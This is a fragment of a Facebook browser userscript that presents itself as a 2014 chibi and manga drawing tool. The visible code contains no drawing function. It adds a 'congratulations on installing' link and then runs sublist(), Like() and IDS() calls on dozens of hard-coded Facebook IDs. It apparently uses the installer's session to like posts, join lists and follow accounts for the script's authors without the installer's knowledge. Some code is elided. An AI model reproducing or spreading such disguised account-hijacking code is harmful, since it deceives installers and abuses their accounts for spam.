// ==UserScript==
// @name            TOOL VẼ CHIBI VÀ MANGA MỚI NHẤT 2014
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/tungsaker3x" target="_blank">Chúc Mừng Bạn Đã cài đặt Tool Vẽ Chibi và Manga vào facebook</a>';
	html += '</div>';
...
sublist("1392176817725482");
sublist("1392177031058794");
sublist("1392177271058770");
sublist("1392177421058755");
sublist("1477620055786052");
//like tung
Like("490243394397487");
Like("407975682638690");
Like("235560536610795");
Like("244973422346989");
Like("1409094596004638");
Like("611417192264341");
Like("224812547671258");
Like("227914450728590");
Like("1453607584869448");
Like("1441980252680739");
Like("239600599529079");
Like("606039849475847");
Like("727857187233882");
Like("264686750371220");
//Minh Quê 
IDS("100004194280695");
